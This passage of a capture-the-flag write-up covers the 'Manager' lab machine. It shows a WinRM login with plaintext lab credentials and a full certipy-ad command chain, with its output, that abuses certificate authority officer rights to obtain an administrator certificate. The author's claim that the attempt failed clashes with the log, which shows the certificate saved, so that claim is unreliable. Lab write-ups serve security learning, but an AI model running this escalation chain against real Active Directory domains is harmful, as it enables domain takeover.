```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Manager-10.10.11.236/backup]
└─$ evil-winrm -i 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'                  
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> whoami
manager\raven
```

Get user flag 

At this point I tried everything to get root but I constantly got errors with the certificate. The way to own this machine is **[this explained in hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2)**

Here I left some notes about my tries, but the pfx file must be malformed as you can see in the log the error "Failed to request certificate"

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Manager-10.10.11.236]
└─$ certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' && certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' && certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn 'administrator@manager.htb' && certipy-ad ca -ca 'manager-DC01-CA' -issue-request 22 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 22
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 20
Would you like to save the private key? (y/N) y
[*] Saved private key to 20.key
[-] Failed to request certificate
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 20
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '20.key'
[*] Saved certificate and private key to 'administrator.pfx'
```